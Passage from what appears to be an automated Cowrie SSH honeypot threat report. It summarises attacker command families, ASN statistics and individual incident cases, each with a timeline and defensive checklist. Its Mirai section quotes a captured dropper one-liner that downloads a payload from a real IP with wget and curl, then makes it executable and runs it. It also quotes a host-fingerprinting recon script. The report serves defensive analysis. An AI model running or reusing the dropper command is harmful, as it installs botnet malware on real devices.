**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **81** |
| Unique ASNs | **63** |
| High-Risk ASNs | **52** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS7922` | Comcast Cable Communications, LLC | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS24757` | Ethio Telecom | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS264738` | Sebastian Souto (SSSERVICIOS) | 2 | HIGH |
| `AS24086` | Viettel Corporation | 2 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (334)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-428ea859b669

| Field | Detail |
|---|---|
| **Source IP** | `81.172.74[.]163` |
| **First Seen** | 2026-08-16 16:55 |
| **Last Seen** | 2026-08-16 16:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:55:41` | `cowrie.session.connect` |
| `2026-08-16 16:55:42` | `cowrie.client.version` |
| `2026-08-16 16:55:42` | `cowrie.client.kex` |
| `2026-08-16 16:55:43` | `cowrie.login.success` |
| `2026-08-16 16:55:43` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.172.74[.]163` to AbuseIPDB if not already reported
- [ ] Block `81.172.74[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-279ba9288260

| Field | Detail |
|---|---|
| **Source IP** | `209.173.10[.]75` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:25` | `cowrie.session.connect` |
| `2026-08-16 16:56:28` | `cowrie.client.version` |
| `2026-08-16 16:56:28` | `cowrie.client.kex` |
| `2026-08-16 16:56:31` | `cowrie.login.success` |
| `2026-08-16 16:56:31` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.173.10[.]75` to AbuseIPDB if not already reported
- [ ] Block `209.173.10[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b0381e2e4e

| Field | Detail |
|---|---|
| **Source IP** | `111.198.53[.]188` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:30` | `cowrie.session.connect` |
| `2026-08-16 16:56:30` | `cowrie.client.version` |
| `2026-08-16 16:56:30` | `cowrie.client.kex` |
| `2026-08-16 16:56:33` | `cowrie.login.success` |
| `2026-08-16 16:56:33` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.198.53[.]188` to AbuseIPDB if not already reported
- [ ] Block `111.198.53[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1bbfa83086d

| Field | Detail |
|---|---|
| **Source IP** | `120.26.202[.]34` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:57 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:35` | `cowrie.session.connect` |
| `2026-08-16 16:56:39` | `cowrie.client.version` |
| `2026-08-16 16:56:39` | `cowrie.client.kex` |
| `2026-08-16 16:56:59` | `cowrie.login.success` |
| `2026-08-16 16:57:14` | `cowrie.session.params` |
| `2026-08-16 16:57:14` | `cowrie.command.input` |
| `2026-08-16 16:57:19` | `cowrie.log.closed` |
| `2026-08-16 16:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.202[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.26.202[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b161d6bec440

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:36` | `cowrie.session.connect` |
| `2026-08-16 16:56:37` | `cowrie.client.version` |
| `2026-08-16 16:56:37` | `cowrie.client.kex` |
| `2026-08-16 16:56:38` | `cowrie.login.success` |
| `2026-08-16 16:56:38` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57dd3d0a42e3

| Field | Detail |
|---|---|
| **Source IP** | `65.181.79[.]60` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:38` | `cowrie.session.connect` |
| `2026-08-16 16:56:39` | `cowrie.client.version` |
| `2026-08-16 16:56:39` | `cowrie.client.kex` |
| `2026-08-16 16:56:42` | `cowrie.login.success` |
| `2026-08-16 16:56:42` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.79[.]60` to AbuseIPDB if not already reported
- [ ] Block `65.181.79[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b035c40a3b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:41` | `cowrie.session.connect` |
| `2026-08-16 16:56:41` | `cowrie.client.version` |
| `2026-08-16 16:56:41` | `cowrie.client.kex` |
| `2026-08-16 16:56:43` | `cowrie.login.success` |
| `2026-08-16 16:56:44` | `cowrie.session.params` |
| `2026-08-16 16:56:44` | `cowrie.command.input` |
| `2026-08-16 16:56:44` | `cowrie.command.input` |
| `2026-08-16 16:56:44` | `cowrie.command.input` |
| `2026-08-16 16:56:44` | `cowrie.command.input` |
| `2026-08-16 16:56:45` | `cowrie.command.input` |
| `2026-08-16 16:56:45` | `cowrie.command.success` |
| `2026-08-16 16:56:45` | `cowrie.command.input` |
| `2026-08-16 16:56:45` | `cowrie.command.input` |
| `2026-08-16 16:56:45` | `cowrie.command.input` |
| `2026-08-16 16:56:45` | `cowrie.command.input` |
| `2026-08-16 16:56:45` | `cowrie.log.closed` |
| `2026-08-16 16:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bb5bfa1074a

| Field | Detail |
|---|---|
| **Source IP** | `128.199.118[.]234` |
| **First Seen** | 2026-08-16 16:56 |
| **Last Seen** | 2026-08-16 16:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:56:48` | `cowrie.session.connect` |
| `2026-08-16 16:56:49` | `cowrie.client.version` |
| `2026-08-16 16:56:49` | `cowrie.client.kex` |
| `2026-08-16 16:56:51` | `cowrie.login.success` |
| `2026-08-16 16:56:51` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.199.118[.]234` to AbuseIPDB if not already reported
- [ ] Block `128.199.118[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ac3c51ebd3

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 16:57 |
| **Last Seen** | 2026-08-16 16:57 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:57:04` | `cowrie.session.connect` |
| `2026-08-16 16:57:09` | `cowrie.client.version` |
| `2026-08-16 16:57:09` | `cowrie.client.kex` |
| `2026-08-16 16:57:34` | `cowrie.login.success` |
| `2026-08-16 16:57:49` | `cowrie.session.params` |
| `2026-08-16 16:57:49` | `cowrie.command.input` |
| `2026-08-16 16:57:55` | `cowrie.log.closed` |
| `2026-08-16 16:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62dfcaf747c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:58 |
| **Last Seen** | 2026-08-16 16:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:58:44` | `cowrie.session.connect` |
| `2026-08-16 16:58:44` | `cowrie.client.version` |
| `2026-08-16 16:58:44` | `cowrie.client.kex` |
| `2026-08-16 16:58:46` | `cowrie.login.success` |
| `2026-08-16 16:58:47` | `cowrie.session.params` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.success` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:47` | `cowrie.command.input` |
| `2026-08-16 16:58:48` | `cowrie.log.closed` |
| `2026-08-16 16:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c2bc4a7f08

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:00 |
| **Last Seen** | 2026-08-16 17:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:00:53` | `cowrie.session.connect` |
| `2026-08-16 17:00:53` | `cowrie.client.version` |
| `2026-08-16 17:00:53` | `cowrie.client.kex` |
| `2026-08-16 17:00:55` | `cowrie.login.success` |
| `2026-08-16 17:00:56` | `cowrie.session.params` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.success` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.command.input` |
| `2026-08-16 17:00:56` | `cowrie.log.closed` |
| `2026-08-16 17:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36382a77222

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:02 |
| **Last Seen** | 2026-08-16 17:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:02:57` | `cowrie.session.connect` |
| `2026-08-16 17:02:57` | `cowrie.client.version` |
| `2026-08-16 17:02:57` | `cowrie.client.kex` |
| `2026-08-16 17:02:58` | `cowrie.login.success` |
| `2026-08-16 17:03:00` | `cowrie.session.params` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.success` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.command.input` |
| `2026-08-16 17:03:00` | `cowrie.log.closed` |
| `2026-08-16 17:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a370f6f19d30

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 17:05 |
| **Last Seen** | 2026-08-16 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:05:32` | `cowrie.session.connect` |
| `2026-08-16 17:05:32` | `cowrie.client.version` |
| `2026-08-16 17:05:32` | `cowrie.client.kex` |
| `2026-08-16 17:05:33` | `cowrie.login.success` |
| `2026-08-16 17:05:34` | `cowrie.session.params` |
| `2026-08-16 17:05:34` | `cowrie.command.input` |
| `2026-08-16 17:05:34` | `cowrie.log.closed` |
| `2026-08-16 17:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28760d1f93e8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-16 17:06 |
| **Last Seen** | 2026-08-16 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:06:34` | `cowrie.session.connect` |
| `2026-08-16 17:06:34` | `cowrie.client.version` |
| `2026-08-16 17:06:34` | `cowrie.client.kex` |
| `2026-08-16 17:06:35` | `cowrie.login.success` |
| `2026-08-16 17:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b258807cd11

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-16 17:06 |
| **Last Seen** | 2026-08-16 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:06:34` | `cowrie.session.connect` |
| `2026-08-16 17:06:34` | `cowrie.client.version` |
| `2026-08-16 17:06:34` | `cowrie.client.kex` |
| `2026-08-16 17:06:35` | `cowrie.login.success` |
| `2026-08-16 17:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ffa49b9813

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]243` |
| **First Seen** | 2026-08-16 17:06 |
| **Last Seen** | 2026-08-16 17:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:06:41` | `cowrie.session.connect` |
| `2026-08-16 17:06:41` | `cowrie.client.version` |
| `2026-08-16 17:06:41` | `cowrie.client.kex` |
| `2026-08-16 17:06:43` | `cowrie.login.success` |
| `2026-08-16 17:06:45` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:06:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:06:45` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]243` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b806ccdfac75

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:06 |
| **Last Seen** | 2026-08-16 17:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:06:58` | `cowrie.session.connect` |
| `2026-08-16 17:06:58` | `cowrie.client.version` |
| `2026-08-16 17:06:58` | `cowrie.client.kex` |
| `2026-08-16 17:06:59` | `cowrie.login.success` |
| `2026-08-16 17:07:00` | `cowrie.session.params` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.success` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.command.input` |
| `2026-08-16 17:07:00` | `cowrie.log.closed` |
| `2026-08-16 17:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa2522d571a0

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:08 |
| **Last Seen** | 2026-08-16 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:08:06` | `cowrie.session.connect` |
| `2026-08-16 17:08:06` | `cowrie.client.version` |
| `2026-08-16 17:08:06` | `cowrie.client.kex` |
| `2026-08-16 17:08:08` | `cowrie.login.success` |
| `2026-08-16 17:08:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:08:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:08:10` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13478b11f81b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:08 |
| **Last Seen** | 2026-08-16 17:09 |
